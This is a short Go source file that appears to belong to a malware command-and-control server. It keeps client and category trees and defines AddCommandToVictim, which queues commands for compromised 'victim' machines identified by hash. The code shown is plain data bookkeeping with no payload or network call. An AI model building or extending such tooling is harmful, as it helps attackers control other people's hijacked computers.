package model

import (
	"assimilate/c2c_server/v2/internal/types"
	"fmt"
	"sync"

	rbt "github.com/emirpasic/gods/trees/redblacktree"
)

// ServerState holds the shared state of the server, including the trees and mutexes.
type ServerState struct {
	ClientTree        *rbt.Tree
	SuperCatTree      *rbt.Tree
	ClientTreeMutex   sync.Mutex
	SuperCatTreeMutex sync.Mutex
	GlobalDebug       bool
}

func (state *ServerState) AddCommandToVictim(hash string, cmd types.VictimCommand) {
	state.ClientTreeMutex.Lock()
	defer state.ClientTreeMutex.Unlock()

	val, found := state.ClientTree.Get(hash)
	if found {
		victim := val.(types.VictimInfo)
		victim.Commands = append(victim.Commands, cmd)
		state.ClientTree.Put(hash, victim)
		fmt.Println("Added command to victim:", hash)
	} else {
		fmt.Println("Victim not found:", hash)
	}
}
